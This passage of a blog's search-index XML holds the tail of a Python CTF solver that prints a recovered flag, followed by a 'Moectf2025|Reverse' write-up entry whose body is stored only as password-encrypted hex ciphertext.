class="number">64</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] flag = <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>END👍</p>]]></content>
      
      
      <categories>
          
          <category> Re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Re </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Moectf2025|Reverse</title>
      <link href="/2025/08/13/Moectf2025-Reverse/"/>
      <url>/2025/08/13/Moectf2025-Reverse/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="a0d9821f73bf2cf079f097ed88f039cb6d68f3fc75aa47ee3b60867b33bd0437">44132e3ca13390c27fafd5d39a7163dadeda9b6052c7922efe89da074bd803e1965c447d2c8ff96a03acffca16cc519041fc9ba9c74c506fe38f963026e3c51bc0c7a55d59d343b5ad4b8b5dfa08b0de4a318d2420c9d257aa327390559d7d69e5ae8f91bf225150a40f34fc13261499651a23cd463872b07843ddd5f43ab8434c7503557ec83b08a82d04ee13d149b67d58f09f86b559b8c9744e8b3d4e1d3dcd6e6dada7ca0433a7c8d73bb80c410d2d06b32618c20703716a502091f7b5bdf95bda111a167c2054053dc66b9d6cc9becbcf195a269b3964216eb2f544adbb5e1b69c7455c8d1d3e19cfd93fb8417fd4b7ab711ffd5e39df378a0bd059f776430b44df764e49df5f1be562dbf9a06e3f4b52a025a0143eb55032612d6a871b866f554cefb3cd29f89d9bf181544616ddea53fd5c5a3074820bc25cce503d73e2d3c85c28127854c6978bdf0b162f60b72f74d7619cc946ef45fd4ca00bc3804ac3b274cb15a1377a04938e6c64b89ee1857de4dc83b42fbfe4e3bc604b9e2c2fbe7d723d6423f0e8735d65a69352438fd9fa3d648b69a901d4dae43f54aac6a1d1acd8fbb9685cfa09c3795b7b1746fed29a01cea474156dd53ea780ff090b3c6b49d0f4ac9cfe0031f37143d42d6bf1e9b1613b45abfe72b3259f9c60032499ebeb811fc2452a7839822c87944d2c3960aae6e8924a51af9efbe7698e6d49da4941f6d4a64e4e5e4ec5cce7f4a7ebf22e071c440933f60f40f19c5485525a990debf031fa757abb0c8911f610c62145bcb28f272c6ac88523b328e5a8d90509c23f9a6fa377cf5d7a7c861186ca2ca32db1a09c395dcf23edeb368ec5b64eb38789cccb9b82a02473a263f37c8df5ba105b2c74c54535cf1624d8b7423f978aa31bf2b8412ae97fb3b65978e3684362c5719a385f15e05f7bdb9d57b6b348d3695e6b38bba66fd998cee10ebb4e91ef66335851528bc08c330e6e3f246c3deda0a7de9fb9d4dde84b4fe33f0e6b1a534a87b0e60077ad8928e47f5476f02aa94ed319b68aaf56e1146b3bdeec89bc00f6fd7a1b9d17c9440d7694c2d77653b8bbaf4528e9caed4d54e4922eedb4b9f906cf4191bc99c554b69ebac1f8c75cf15a92276fedb50204ee378398593596ccab51c493bd257a38e44a11be3d9ae55c1d6e17e34d9febb7480fe55fd5a2fbcb2ae734f5e49570e45d3b83c0a723e25e2b5704919eb337fcf472490b835eda4279554edec4796a1b0cc7b50c28e0f0fb1a140f0e1848b43e0a804c98a55f6fc50aee1f082fc835f6c1a610172d85808f5c906addd22ab4ccfbe885def8654bce71781fc5818dd0ab35f5c336d5b05e30480b0467640988905dc849f345fb7b826346351e284a5ac629dc4d9273cb7f56bb25be13da896479dc88c28a5febcae0cdfb17a5a9a67310dfabf267da6b5b3babf01ee2f417a2c7ac6957479a9b72130c3f3cd3826f19f5c11ebb43d20efd731694f867e36cd234b1f7522ddf9e1544f92bfc536b5ecdd7bf6ad67ab09ccadb5a91b8983f70d4494b55320e836905f8acb48ff6c363d7687b04fe263aecaa6207957c2af3f18d8b5902a7d708d50ffe357d9e0d9ee51180d4193f0947f9a444c5c07b3fc0d5c4a92a4266fb2d1374903b72422476de4605398d4b3d288e1b0add689e345a58f4981c10da3049223cdab0fa9f2b7d9f4c475a06e4dd4e5c2da3bbd0c93bd23a78f4313c80a921e8b7bc2a49cec9f47b016fc29fab247cd4f5bebe617a5c69dddf7f5ac2c85fca80027ef7e9a4436c440d7e0e1ee8a97e2d866adba70c77faf3aeacc404c29886055c8aa52fe8626f7a130fe8d83f9b416e72e7ce6cdca6d703c4344903529a29e94ea9714a9ffc3dffe9678715d4f031de07e5f23b837e71514d37143c84cc346af1f71c1ec5b8098b6f6690e1cbdd1aa4187aec5062b2d69835bffdd87a7796638df718a8bbf5f380363dc5004d2b40501645a761d5b80367d0e485dc9dfa83911f0e9af8c2fe2445d10c15470ffcaf8c4f278f68e7efa7b6fa46a09b1b79404f837890387b8667008c230c6601f1be803457d0826da20e0a72e74ec7c6f5ca2948d8fce01474033379df997a1a1ba389fea617780cddee3276d8b1db26ec0af09f13e30b95c41bde7c21943299430489df245e924642974bfc2c9d325842ba58e20f3b4872ac0a9ca4e108dfddbfa4afce1bd855c1a0394c5cb91b897f28a37a5f5806ed1d9a3cf370b7a4ad9bb16767073681e4747985086fb0ed8828cf41f56a9374e0bd4b01d938aaf900223a89279bf066e967cb11362b06d5c61e12ec3f465aa702373f40c338a9e91aff6f6abe5ad254b1f6c2c08fdb11cc361ff5e5b5226f09017e5b01fddb3e3d0532030a1c282a15fdf6be07c216d296997fb3b3e04e9596ac4c1422615516b6401b6a068687b49cf7c10a931fd92f0f097ed80930306d0da3a805abbed4cbb91c08de3af17e9bb2df50b30068f6e5e62073b1a3e46a42fb56ed891749d738f7636f84565f45b690ff33cb6a04a3f6886506003fb09d54140eebd5a2d52290576cae5986b24b2aa19b5643636535deef21e39c9264fa565db408a1e08fab025363e6df06d0c6044b280781ffb2eebcc35381e8370325a11e38e31cddc1ad8ebea90cf47858d016ada5c35e86b78cb97a997ec08929ab4e087c8562b0988fb5d8fc81255f65a14b4396186b1a04ead0ed57bef9e87d9a6a6109c3d3ab6450ee1d35e8ce0c7b1df8fb10a6c14b4c3fb42fc7e7d579e77d056c8c478874c146a6e61aa88ebf7bbdc21d3b834683a0d3ae3002e9bf8b1f3e4275ca3d30c0decdd3d22c72b47451745914c7ee108c100f004c779efb0aacef8061fb19ad3eff1f4da60f2ccb476eec52ec1d0f5a306ff03089b562659bee5933cca935bb59f5efcdfe088753aac9428d96b5ec882edabbfa930bd97da13c2a285dadb6ec6b6b7315ede6d4a2452ac298dee7230c5fe0f83410c68441e01b7877f47b53db2ba4c70c55d92ec0ece3b23bba67a7f85270f5f298946fd529a1d0793182a32f8c6d22d36e705b34f0e6509d1efc2659dbdac27a9fec7c5a8aab2082c90da190f8b936e975e248aa2b61f844d4ae00ef2c03a8e3ca6a03c591ff0ea0ab6fd4ad3acf8d3942c049c0ce92c51efd46ae667ba05e91cfb5ebd2b97aa46a4670c26c453a3e23b59aba990175ec2ff65ba38b7d89a5c6df5e5d49bd6329261be84f91c60d8bfc9233cd94ac8c02e8fbfd4c94f02e2f3710f880ff3477d0149861d38f1b00b421109749569158866c33c58b56f74ef6ca7f76db17d7a5f71890e72bed2cc1446d32bec21bc06a5d0ae2b627a45ced05f73d6f6b8aa15ef223217acc81b9297d0e0e493fa0fc9eb0bdfd13c1353c99fc958eef8ddc7e748796bf62c956ae2ce4c5794ca10a7cf7c5dbaf10b001043990a804aa54ef817e5c406516b0a975b1857fb5f086d08c025fb600b34af62f93b29a7c5bf4d003e6640ce3121b7211e92bd1135b57b134f86c76990c3871bcc53f91997c7e6743a0b5d26591543c1e87a7e82871540011e69b76c4ca03fa448c4d1457a3c325b26f3a641af2ee518910d586e780045d5b833683e43ab0faa992d94d1ee41f1dade95a9f5c017d8538b203600f398407518044550a8baa73f5414fea8bdd77dfd5b2441e39b834896d8311487f9881ded7190cc0059af0590c9afb46fe0225e9d3dbfdf0afaa17e6916ce7c89adf6a2eec736b03195c39441740232e86af40e39f0b505368db3e5671eb68dcb59a05268e3026dcd02f3f059be37043cd0a4d22ea2a4251c80a0146a6cc2e9200529a1a4b213dd508ab92f56433fd589f5634301069a6a076e5ca750dc886441648a314eaea9cec68c387093e1fe7786801dc464e5ac5897db3f75f6e0c4b050b4e722000259bf7e405752b377a120d6dd819b8adb70019c07348f078347c66a08ce160d89a7536b958e5ee1c542efd347fa2cd2a95769e150174615328c3b41ffc9d1f01ee0f701495330585baef01edef71d6a10dddac268e18384b525a6a8f23d289563d1d0e57915f625b5d3db3924f1bd970bba7431c9df206e2e1ddfb30d391550e628255ff1be157c98079870265f7eb17db854ddad505d986ce7b29f097a02bc62e47fd3abf7380831de9a5c86926bd531890631babe83a1c2f001cda73a88aa50a1a5392424fc6d5cc1ecbd8ba4152e45fc03de67f46e0918bbf06761640d2aed452af90b5fa2530b1b75462fc418e05ce733317543d0200984d37e24c98efa30189dbafce05a8fe6b1a1fd5c2d0b8c00dc96ef10034f7193432a2764015fa9c1643090f9cddfdb826a1929f8595d8891ce7af444c9dc6a0a5fdce0a51a3642976cac9ee02efe95ae8c903836fd7687216cdc469e878e0fd312ad09e0edf3d8343a8016ec206cddf6ae98c9d0072c492361ad6a6e4214b43a641da58eb38812d797e65c2a0bba5c05172ff834af1b9312cc8672a12b83174d3c0b7eb75e5f5e6d8f47df36d93fa599993ab89512ae466395ffcc5606636add30febc335fa2aa7a960a8d72d4fcd069e6e9df1e258727ecbdc78083f7671a59521d3770e1b4a547dcf419fc069d4971060fd2e1521e2ce522394c0d7ef80eed85e167e26dddb05c918150cf30c6ece1acc2851b47a3fde6dbaf012935f8eb235f8fd92a2ba2778e70ca8673ff66d4477c5e4f63e8f752d41983ddc6fe5c9439be0387c0b5c5a7b3f71f9ec4e46c868b3c828dd7927072136539b47d4c501fa6dadfcfb2f18904b6ec1db3319357d26377b94d95461286d34e7ab329c1de75c6c9475c2ba8205dcbd2b62244b838bb6365230d572de50463410ac2de1bb48d77c785003a74b8bbbfe9ef056d049a36bd4b93e4149f312db3902ca38e4925dc0eaf24e161dc365a16ae87d3872a9ee4676827dc3d5d4d611f6f4fe48af8b3bf0f0243e260943cb7dfccaff347fa3b0a76bf7c5e8cd3725ea86264767dc401e624e5f9e7d9cfec8196a588772634ebad5acf722de141846b08cb3ee711e47bf6d29dea04958f56a7964e52742b7241303623a8999a9b6d33da52ce3f14feda1d4fab2eefa13574ea89b26595e4da7bbe3670f4d59651e686fab9a535ef0e30eb94eaf62270f355141fd3199740dcd7696fcc08b473a4b54b68541afea636b219f7c892db55ef6e5a7e1d03147c0b0521b6d12bba54b98ae8eb96d52b9d80244b4f94124d40f09ab5a0ace2e201feffd16c646b40e4cddc5fe5d689a442edf92d086dce450a758583c8e6002f49acc25806e61c973b8c1cf2b1c2594eb0294fb73a53023c7fc0bc5dbaf4894f7e4720e9f8d120aa14090580426e8ba4e574f46527f3698f4f66a1c743f420bc859300b1db7643bd36fc5d2d48fcac1a12ee85841b8a91fa1cd5652c971ce36c7727684fc8d770f861d6bcdcadb6248ae4702ecf96cff82e106352e3cbfa91c7453ab63d41aa218e4c7698877251097e28dd3dca77e2cf7127a050b219233e7076fcf8ab5bb00859c7bcaf284c57d72955b4a3f3d16a5a6c4b979f50fb3523c20204ff01268b92a3fe15e198da42f44cc6687a6e6e1c90918d26c248f606d3f1f49bc3aa5634edc693bc3add3584291f0d6e40f54895c3eb39ad6cbca5af0d9731f51e8fa0cc2ea5d284e540b70ad7501dafadc11275f66ae10e5a7b02fe071b0b4a383b7f8baa35a917b8659c700c51962a4a838445651bab7fa9975139c8fa06731847f8e28352ab1b696e9ea488227a3ec5ca720851043d69d088a32a8f59a4c3e0cbd02598d1b6255f25ac10347e9e2af37fb9c467e00c79a9f4f47740b49c7afbb5c2e2a97674f4db9982b4092bca4b5f66432928a9bfca168a7fd23ae32bb3d15a3fa017f2497ee5b7947540f93134a8cf32f956874e1d61f5d14461040ccee71fab738c4afc78de3491386d547bddfa763b4a00106bc2aa0bf9c3ff2d0549cd94cebfb4179498b735e4cff3c485e30107c0bcfda033b070b2aa8f6363dbea0859b1947e7214b78df88c60f67dedb4cdc53553214d02cb8eef3469d083c2db886ef3e62005d1af4d9bd39cd6db69b1890e6ad7b39b6676b33ab0feef2083af6f6719afa1f3f929e840c1e4e2f3fc3036173e5abd6cf8bbae003b24b5e4ec27574cb223a6e1822c34fd228bfdea21ed17b1269af985d03c1d9615864f6dd4841fabe3d3252da84a6d70236fad0fe52c1a7f6df32a7a581f8e2da2ed3987e77de9fa47305cdebe8e5481993733f5434edb57bbce6c1da3c6a252bacf4fe750b4fdc320d6b67cd28fd0cc4a279e9bd6c2c4ab7e60e098af50658518874a20bb88b143f357aef2b4e9adb8da2f999058d2444f2a0e0c38e06bd1db40e8b932dab927855098c75fb8847ae2ad4bb08200af8b7d38568a8e397bbe386cc5c93ae3f65d239c11521dd153ae86211855b837763108e55771475a69c7d4df0e6450aae252e8ec5ad5509e9a0b0cd89b4432c0ec1dbe9b90d2dde650c29392128affc9af7b8dd6f19deb656898ae31722c70589aeef3f8220ff426ec21a8b7740552acdcfab57f4a2ba18743ab1269dd31d3cc3b00409ba093add83892b0b540426d95f479d45d27910b45caeef8ddef9d67157da188ef8d5f34e47235c16796a6be75d316cfdd30c6bbefc60e111669817a7b1cf34f459545156a72a0a1c268257ca0cad1c5e2578169e30ab14d9e573eaa21a788041dc0119243e03d7ddaaaacaf6d9be2515304ac4650b06192ac6f70dfdd7b2d0da3ec74b09fa29d0d8e179eb09e5c365d316bd768f6558cb29148e43b90e319d92d7b2b5ebe1c3d0fdb65924d7229dcf055963a57b0abe35a42b5883b11f4cecb14d922135169cb451624ebc6610cb57e82ca226ba6681d63ad38f33ca5752703976cca24d88e1884fb72004fd3c3af929a2e3cb368bbe435de5c34b1d6a1a0d57209d16b528f97ba325b46c8c5e34b1dfbc8d929903906ea0e75fe8fa20b9a4d928d292743c7da97274938226bdb6011a626924af64105feff64e8d12a3021dc60978ad5e56d0e95a4482f351fa8729e26b2406f79a3a0e273ab5ae72c7c7be76e474aeb9ce62fb9bdfb6dd0cafbecd1ba7f814c69869ee2d9905e1c3bf0e1a58690ca870e1462b2665e539f8698e4dcdc190bbb97d4fd975e809744da061a39d96074451e7831d1755874449632e5b8bdab05d3fd94454b76c78a72d5be1a17aff7999e63871d061b8556287f21eba5937a1d9d46995173b02479fcf51de8689f3df70f1487d1ddb3c817d593dea8c9796371dfacf52bfeef5f68fdb37162f82c8fbf3e267f0d8db5c831bebd0267770078290a03dfda9e21e9e465086066030e1b650be539e948f2eb6bc7316dd3a663f61263ec99f624a090ee243fd9c99652b7b0a30b5eef91393ee8eb0c3174ba06b06634a58e5b99df48492c17bb8b60d5ec136b6db64fc6665a025b69fef13470013aff87296a10320ff7591d883813249114f96e595ee95957c3686a7dce27f08456e468554633da8ee9635de876769ed86865940ada4856800ab967aaf3582be96c35cd2c3cab1c82feb51773208b23ec88a6d8a0a82b8b5c9a33984e9f64eebf92283bbeebfbaf7b5cd7875d23732bac415baf6b94e4b2f442335d8729978803304517b010bc3d7f24c5fee60a53010c453f527539402892b3bdf6001154fe321677f9194a45223f7d77aaa510efcbd2c11927722c21b2db8607476161d65b80e12e32bfb50f9ef2b7eb178986a4d836afda0dedb59a66ee3942369b00c6a35e9cff01ad00a212c0b9a4929e734251cc9004068a1c0b71646050e2b9658e440a51e6e0a5c4825d0220e2a533105f70622de91049a58164817599cab5e72efe0e027a6b546479283f9ac9c1be3dc14205f4ab1ad7f98abc3ee7b1c89e515f0b81a122a62e468195ee6ee5b0a3add0057d0df3d6b53d19f61fcab239d4f3c66e2f70dd1dd55350f0e5548cccca27ed193416f7374668b93316501f6dc85b4dfcab1c61dbc38907dfeac269a7d6380a8a7861aa6f3c76bb8ead924e02b83e6369f7f9e28745cf52b50cc9e410a294c9ab1802ab15301cd1090ad09bea380b3e00d995e4c7d44fbf9b3560f4eaeb0907386e2dc5c461b08ebb27f3407633650a4e6d5034cd8cc61a62516aa4f5f099b3b30ba6e0c9f9a302bfcdc8e2c560916409e1651934496ffc7c31d3d33acf6a04c03741e6899a20c841205177d9e594cc0530ea74573bf1f089b6e5d9e72d1173530e91b0f6cfcd2f0cca8ee7ff87ab79e77fd7bacaff3406dddff37cd7eb1829d796c1ca1aa5f51fd827ad01927762318173fb1279306b4a0c160de3c1e51513593791f335d09766a400cfaf650c77ec9bacf4491b0a111c50df3d98c75080d3825bf40da4009892b5bc436b5d22b5ad41f9052bbce2c00fba30a88b738e36ceb0d1015e0949d44942747b74084335da2e44510f2a6411cbb169ad24be859d6985b309116fafee7e93ecb79fd58b9e0772df69d4ab8eb35e415f63dd6c02339c87e1daff7739dd6c02abc20cc0c459ca8c8a1bef0c000b08d453db1cdc49625766c8af07060ad4859901c4fb50781a511511d7d70e65e238bee02f6399ae3230f90b00b62da9e8834ed13e11d93b241ab6083c954819d2134dbaea798d5fad82825f451c1b604fabb7ccf1616d3439e86258f0be51f2fedfb7a76a8b119728d344b9f3a3d9788d72ec16c0f4884d6c39903a238b6b544fc46315ee2fb9095d7edb8e85554517b83c27148dbfaab3ac3c3dc9e83bb7912b5cbc3d4a2b31fce0700e7e8d4217110e5f3182381820ca6737d5bf57f38310dbf356ec70b984e4662f007d6822900b44be56a0adc1758ecac4886d678dc3e0eaf1d3f247608e718b501fdfc5bd822e7c0843596dcf10a6716c343118ca9d52e544486f0673b7698f9435278f5ae2a7eb18a03ec046c40b38ea16c39952265c547d2ab208dc115e409e3c3e29e00e7bf4bd3ba2056d15f53ba1ea857ed25210a20ab1e049c9e8d987c81fa72d9e6dccf5a13d2fe54d9cce7ffa0af329af09a12536cdd9bb7e2f8d16192dc6a939bdd6df480b5445d129b24c7c1611a0635331a91a09f3d377c930247ab0f1e030518dcb510a09355e408f35fe17a74e51d815a5d5d4e2cefe0ad5e96f249fa8f3f7cb0b90c1c92cf2f1e46badd0dac4260a9352e528f85b9f77c40100066d9859c01dc4b9c3f7f8239baa769de8cbf78e732c396ab0225efe4c2c68d5f81e2a5803112c64c52546b32a54101e00f4914df7e68ed727f4313500a542b4d32538423ac1aefd3ca1639e46c282157224ce5eeb37ecf8ef36e96904591fbb9d820bd4a237fcfd12ebe8fef6e5da87d8289efd6afd0f233a2d3c082110188bf26d6db21206c77505a3238936ecf4c15073be371a860533691cc84785de65addbfbd857a4453f0e1bdf06306f76ea01de3ad0aa4930cb1bdbced9fd5c82ae41773dc1156508da878869d01ec4d243e35162ae4f83618282ac21af88ef013d2435e58ee497d5ec1f621277330a7e38e7afce661819adc2161a6d7c2e3a9f0ce29da85c65f90975d607bb9006f7875b1b89ef35063f934351fa7753445a099d4753e0dc5e8c8d4a6d5423b3f0126542561202f2ab3b80df344838dc8bc3a26218f42ddc9d107781acd38ab4dd4dae3bc718239561f96dd6e981c93b755325d5d2459990c1f684c5893806cfbccfef528f17b35a9b1683e30a11dd18c22723e67670a9083e291aeda6b86d7a0bc0c6446fd0f3ba38cb35dc52a5914c0b9db1c30cfb019d16ed5794242338e89eb684906458d9437af8ae14bf9674e10ecd54fffa2c3473c47a7c70cf60dcaea101ea391890e4e2c74c1fb27eff443c7f9e8889eb0b569dc324265c2fc34df8d7338a4187feeb379945865b20648b7d345a8f2c7fecabe754bb713df7223bfd0456715b84a3a23ff9a015dab45f30c036a4908511328123780bb0257d9737c3735dde1d100be68237623df9aca3c1281712b69bc6fc26cda3531a9fd9285dee9acd2fd7d32cf554c7b427c3609f09559fd2efeea6db3e4ef250d2b0fb274b168cf4554c013bd359ac78b2300f8aed73fac0aef3a8fc8b17b43bea3ac1beca7d9fc200c5e1afc13b6e7ccad66a6a42c36ca99afe7959d36b7ea7b168c68299a9724fe4e75804102a2fbcf265f296c80c31e1e1117d4b1d8f3bbff0bc401da487223149621df6d15a8a8097d5023945af70af5d8c49125c6cf1e890e9c8832f7e129bf6137d0910505b79c1fd9e9fd3b5bde886014a9bf125c3297cca2adea27a2f0e882a56ced4aae8b0de526834c2f0f5b7970bf74e2aac60bff8ec5f1206102064135960e298c3d36a650be182a4097600af7dbc5c8d82114387f500522905058365b73bcec7316c611893f2d1c34a7519b7834da5c4e301ae66fe1dad83ecf077849bdb5c44c5c682cbbff731970c98704fd2385c639f744d77a99cd589c2b67ea3f243455971df52f634a9f82bad94ad0c704b36556dff65f6d0f5234bb9c7d1d7b793b6a9a90aa5e968fcef0881cb08c97e2323587fc44b6cf01bd78239b927b7e79b1731b5803d8f91367dfcca104e177981cf1eedf53fa3c34d59133756dfb1ea23eaf7e18235e82b79cc8365f7f62afa71f014610ce833a6d6e5147402a4dafb912214d58ecafcebf6983eb9e57dd979d56c251ae8e0b354b4640209911997921b01d3cc684a8227abd883fd88b5730d947b8f5442df5d737208ab55145fcfb9695f322d034a5bc59c3242a70041b073f892b28ffb50d988a37139ac744bb684409207cdcefe2a09031927f86c39916ac145265d22c57c528dcf727c3ef3b5ecdadc8c8da2454a60ec2ab8f11f566552c15417fc91add784f19092ea4c3618efba19c1e69cd40db52ef5fd4a3d2195a09691ecddfe3a84101094d047298b245dda3efb9012151e09d628919d08a6243adbec8892abe548e7010dd06e5ed7293e0d6006144f8f019c14b9fca2bec88dbb7a259beca1e09055f2dc84b462295b3bdd72e2832b9cb7f9e03430189ecdd67cf180868377409f777adbe93404d538b618e2f667c183c40086d9b01196c04aa315443c64dccc9feea4e874048499128f8581f7f3f13e0c4505396633e5cd186b425b8f2dd08cd0c333d8eaafbe89c340676a7c6fc952035a3f16987c559bf60e05012de46872450c43cfcade59019a6dda72a9c06b1ce885839ab3ad760b4da79db5f01fc9e73b003afef7a70d592cc17589142ade3f788f5b3d76ca468f2ca282e336a6bd1dafd30d67a4ba1cdcc708e87f8c077ee5b293f95c7508525c5e08d28c81d497f8ad23bfb6e7768b57d2d8bd027283cf3e8b9d5d586cd3c61a6b26f855219f2eae058cbe90ff1b96bf8de9ebe64b80e50a7c4d576b43713ddcaf5df6a88c2904de18ad50634ee09238a886f1626b10fc7fb82ac954ae6ea44e06b0e333e24e0cac4309b3612606340b7cfed19b0cf9bc9f3b9576047a5cb0a13244b06233dfb3f2344b66ebc6e65f64c68191cbb4bc0f04625a786a982219bf4f344f286cf3ac3bf63e6747dcdee69009d3f8ac2f4ba030209505516e6c9984339e0ea3042a1e9da343cc924b7eb5d3deb0eeb069b895708a5d19ec7fb4085dcd06050c0a602db72acc2c2a778a19cf92fb184bdd1b9c1afaaaed90054dbf0fc56df2be357956b4cec55a4d4e0ce74c524ab6f1a5d72883f3b7f5669e011d55281eb3c066e1d3c6eb53bc4ea719ec5d0f47a5d3b623da22c874fa04541b9376ba17b40ac25c0c568459ecaa60b87f341dba289ae1ee956bc0bed5628c4ac28dae7d27c253a23deff0477eaf1084c4a5d48a8df0051833520e344821022bb398a02e30efffd28281f72fb19176b3edbd1ec82c9bdf37b7d116846ee1a8b77d198fcd434b8306d7e4ef9f6af96d5872c981f03a61f94fd2b5a7b6a24c62320130e9f481515d3d40b41afb8a6f0bbc057cc1ee017972f5e7446a74cdc725de7486ef627cfbf85c6c9f200cb3f0c22a630023f4c16df8a2861150eb2b22a037bcfc98c0c24ff5669b7661532c49de25a29a4dab371922bf1a9e460c1c044eddfebba124d11f0c61b680c54f371b0093b91aa18abdb42ec8cc1e3e64eb34ceab5e5e32e146b7588ee9f5bbfa490af872f7f0425f9ad40cac7eda8f9e7753a45811b7ac787272fa70880d55d854bb3b68d4c76f641081aca341944984705daf90cf71d4908defce2cd8d89c16dd1ed72809a50fd7aac9e3cfb2b3490e6401628a8cbc52e054bdd2e6fa8c1b164f6c083976640d274efcb5377056797956a666d8ce1b29cabe57a2cbb32fd9b928a52bfe10dcbed868ebe678a4eb0f5e7d3962bce1fd314802b24e0d346ce07ee3f7e9f9ce7cafd95f1dbe2a4260e1a553e61339f52a6ef5bb87106c05e84163db73e62ab4d2088b252e2245b4516b06ed2c74527ede50ce1f894bda30dba9071fb0ee3692a18ab6a325be8eb4f69f087c1e53a99cea599daeead0b8e94313b71bd2c3b27aac7bc6ea587c0cf74c2e5401f31025b3ed5962d130512aa129b7457bea75e301d811e5a5cf22c9017e5964548df6610a852ee8894eef623ba5c8788f818b3c644edf097e98cd322153b60afbaca6de3c708f096ecb381fbabf3dbd58fef7b49005fcbdb8fc106c84be8fae6977d17ccca8003ff4117e1999569fa1854351f71ed8f94204e64e89801dae0418f6af66518b0362d33c58f37c68712700fa6e8c6bc13e276e2819570fe1615d6b663cdec8d61e79b195982987ef74a4dd4539e9dd6566cf4c6eefb46e67f81e0267f72b34eb393c22bdb68bd0c098cf54eaefc652765faaab9210152cae37558e5e291aa9fbbfc7404abb9b19ddc565a45e508a4e08310717f583f3461573e8c586ced99e230d54547a94d8bc2ffb2b1ae103ccf1c8b5a5e4b503dc5cf245c5612e7d388bc27b9921f0959e274fb6fbe27702fabd283060c14d8993c91dc0306d8502cb605388068f3256ba377854c35403823d4193feb3723a0d978f0f4ccd67e468846a68c72b47a5c9f9f4ea64d3311446674ee12f49a9b8c6a946754ebed2ebe7ea9a7d935f5980d86e0ab2a1a8495cf10d64dc4dbc69a968e60ed07075a98cc8c2a9b490f8a3e139281f3727eaba51dfc365f5b8143c46d5ee8683221801c548f1bf5902b00ffc03ada5bafc94e5459c701e6be4d1aea34de3a91b4880279b1e226e54e666012e82b4732134ef591a468c9ddc8677a62d808235f9e8dc7fb8bbcfdf4e8e075efbf632a32674d737af5c9df72a8947e4ae82d4dc0abe92d44cad6e1b09cf2ca5de22894d77f9ed6f8a96a72df3efb9fde11d05dd05bdd9969ae270c7cda10bbd283ccb2a03f5be8c6708c65295a1d33c617428c671a01f0d2bd9c9c1c41d4b7625f576f7ffa311c6c4b0278fc402843b67e42697544062c86eee0b41a14c9d45f40be4127790a7a0c8af9bb3481faa0b0c058cb6f8a9406825e8b7041a992b51352c171eec146eb1317ebe46a1271f13b596a5523f88a83cd8591fd9f300dca9aaebbc1d6fbbfe426f19efcfc4a9494a9eec74401bafe32af6e15561a3782d4302a83115b98f2468ec7ec30559ab311abebfa4ecd9aa5af810e3df9741c420a88a64f4a507e834f6418d702645fd0bffbdbf8daf56169ad4578d0a3841bd68ea0a3449693acfabf27af894a9b14cb0aadf93bfc61341af123a9799c696e077cb06f632c37ec83f73341010a1157e94b6cf737434b00499edf9526eb588d1c616e6ba98ed590a1a7f4a6d7ccee9cccc5c6ff0c41ddf8ef6c0daeff2b5056700c3be9a88a56b431ccda7ce40ae8b60f1af9b19b739c423ad83cb02082de62e8c7ee1f58e09c6276653412f5efb0d07b10cce61dd06732cfe7483a223657041ef84651fbd36c21871418242229afd5dbe60748e79358594a4df96851fc45b5c5c720b328f64f45d63377d897dadbb468a27d4f7647b29e47d27fc0ab190ed9097e4922e5bd554118070210acc9b142fd35977ed92dd0d44572de5d24fd4a8b030974db3337e3a6fe2b4466ce7681485ff9394b53906f3c3634f799428fb90a6bce72c91e94b486977c7a62b0e53284dcbdebd7e9d870644fdcad38b15ed0f88b7885020aed0e55bffd6700d0380f77bf29303079ab654e99aec1bbd81ddb2eb3161aee813723e044ac2c0a4bd9a11c27d454ffa7a63c7c6a7d2a07e86db558cc539cb444787b9e7c6fcbca56f17494cb7b8965af14bf44db7ce222e860f906dc8473ebafda1317ccf169e3c0dbac8f5e6d536e659fbc33164279adc5b2ee9b4b52981fc80e7c822c4b805bb0c41bd958d5b1976cd8d22f81ac7aeec17afeeacc51b9e6a97298090034907d6a2673425fec0347d56ae7ec6942d1919c758e4c60a7641f4d7859bb0aa8caee8e5384649a2b7805b4748214c317ef2425e6f05b4b60e5b1ce62f954e222d703891e6a394164ec9552389531cab71c538eeb82cb3d6a88edd95d1dd6c46110ddd5b94209517f322ba8a46c63a09921385659b09c4f4d35382b206fd13a1524570f21409f240472884f0641f1e2a6e485be35db3510ee1c9c5bf43afa85ecddae059ba7b866041d61763de86aa4c58a7d3d90067cec305a8152a3b1eda73634b6a7afd8944a3f0a64f2a0c95f75b2a24557ea5cc2c8095590e9c4c87aefe1c6aa9a6c374cd2ba9836af32c5e7a579d19acbc09cd6225c9168a3deb9da2e91282ec73c40b9bbd85c63d9c89916e21a2f4c849804b2844f3a20944ff513e5299d81780737bec1033a6ebafee7dc9d2941d1ab68f951806cb91736858f23ac57ddf369c2a6f16fc3ad78c03fa2f36be69291bed3fdd87c46a934e423033443e8230110fec82f0f7c5a5c54230ca00adc0c11839eb32a91ba3963c640c6e2b154575eed893b29857e85a4b43a9dcf58e35f3eed5ad5572b21b47190adc2cca5db7f641679356d5636c276a4ebbef843ec51c9829e255319132cbeb50072f99224a65e48cacdd653ec747bb0ef585d1a383caa56840c174b599338c7c0dca8cdcf8b3453ee9b3440a891de7477dec0ba426983cd8e8326daf17223551c22e2fd0a77571bedf0d50fe6d1eeea7f3e0716123fb4ad406916b33fb699b95d6c94f35a0f55a8a6cd2b075b2749e552163864321cf0c375e3733fd09a5f5b15b68ae63048d52e00022e14fd0c883186edefca21e69af9caa115932e49e299cba34f246fd78e753d136d31287a1c6de5650a61102e77fb7555e228cf15109bb6f251474e4c487402ba817649e3a52a471d6a2da3f522aff25bd46ff0c0402d139a411f5f776740c142f9d3e07280d29a2759edd1b9e846f5055f2ee5215b863123eba49597831d021d2ddf716689d678b4fd004ae686dcb4d28c9173d4f3bf8ddfc97a3db02bb23f6c09465c777acf72159bf9f6d44510b25e7babbe89c9b85103305f61a9936516d72dc9ea0a77beb49cec4cd5f4759a198b2650dc6a59cc877b0e78e7e4b6aaa64f74083b747577a7d34569245821d7ddbed22882e5ecd18eefd92bfb3b1c06c